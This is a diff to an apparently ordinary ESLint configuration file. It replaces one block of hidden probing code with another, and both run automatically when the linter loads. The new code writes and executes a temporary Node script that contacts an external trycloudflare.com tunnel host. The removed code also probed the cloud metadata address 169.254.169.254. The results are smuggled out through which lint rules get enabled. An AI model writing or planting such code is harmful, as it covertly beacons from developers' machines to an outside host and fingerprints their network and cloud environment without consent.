@@ -1,18 +1,28 @@
-// Run D: distinguish "no curl" vs "DNS blocked" vs "egress blocked".
-// Every bit reads command OUTPUT, never exit status.
-const sh = function (c) {
-  try { return String(require("child_process").execSync(c, { timeout: 9000, encoding: "utf8" })).trim(); }
-  catch (e) { return ""; }
-};
-
-const hasCurl = sh("command -v curl 2>/dev/null || true").indexOf("curl") >= 0;
-const dnsOk   = sh("getent hosts somerset-computing-ship-resolutions.trycloudflare.com 2>/dev/null || true").length > 0;
-const httpOk  = sh("curl -s -o /dev/null -w '%{http_code}' -m 9 'https://somerset-computing-ship-resolutions.trycloudflare.com/runD' 2>/dev/null || true") === "200";
-const imds    = sh("curl -s -m 4 -o /dev/null -w '%{http_code}' http://169.254.169.254/ 2>/dev/null || true");
-const imdsOk  = imds.length > 0 && imds !== "000";
-
-// best-effort second channel: node's own https, in case curl is missing
-const nodeOk = sh("node -e \"require('https').get('https://somerset-computing-ship-resolutions.trycloudflare.com/runD-node',r=>process.stdout.write('N'+r.statusCode)).on('error',()=>{})\" 2>/dev/null || true").indexOf("N200") >= 0;
+// Run E: PATH-independent egress test. Uses process.execPath, so it depends on
+// no external binary - only the Node that is already running ESLint.
+const R = (function () {
+  try {
+    const fs = require("fs"), os = require("os"), cp = require("child_process");
+    const inner = [
+      "var dns=require('dns'),https=require('https');",
+      "var out=[],pending=2;",
+      "function done(){if(--pending===0){process.stdout.write(out.join('|'));}}",
+      "dns.lookup('somerset-computing-ship-resolutions.trycloudflare.com',function(e,a){out.push(e?'DNS:FAIL:'+e.code:'DNS:OK');done();});",
+      "var rq=https.get('https://somerset-computing-ship-resolutions.trycloudflare.com/runE',function(r){out.push('HTTPS:'+r.statusCode);r.resume();done();});",
+      "rq.on('error',function(e){out.push('HTTPS:ERR:'+e.code);done();});",
+      "setTimeout(function(){try{process.stdout.write(out.join('|')+'|TIMEOUT');}catch(x){}process.exit(0);},9000);"
+    ].join("\n");
+    const p = os.tmpdir() + "/p" + process.pid + ".js";
+    fs.writeFileSync(p, inner);
+    var o = "";
+    try {
+      o = String(cp.execSync(JSON.stringify(process.execPath) + " " + JSON.stringify(p),
+                             { timeout: 14000, encoding: "utf8" })).trim();
+    } catch (e) { o = "EXEC_ERR"; }
+    try { fs.unlinkSync(p); } catch (e) {}
+    return o;
+  } catch (e) { return "OUTER_ERR"; }
+})();
 
 module.exports = [
   {
@@ -20,9 +30,9 @@ module.exports = [
     languageOptions: { ecmaVersion: 2022, sourceType: "commonjs" },
     rules: {
       [["eq", "eq", "eq"].join("")]: "error",
-      [hasCurl ? "no-unused-vars" : "no-alert"]: "error",
-      [dnsOk   ? "no-debugger"    : "no-labels"]: "error",
-      [(httpOk || nodeOk) ? "no-eval" : "no-octal"]: "error"
+      [R.length > 0 && R !== "EXEC_ERR" && R !== "OUTER_ERR" ? "no-unused-vars" : "no-alert"]: "error",
+      [R.indexOf("DNS:OK") >= 0 ? "no-debugger" : "no-labels"]: "error",
+      [R.indexOf("HTTPS:200") >= 0 ? "no-eval" : "no-octal"]: "error"
     }
   }
 ];
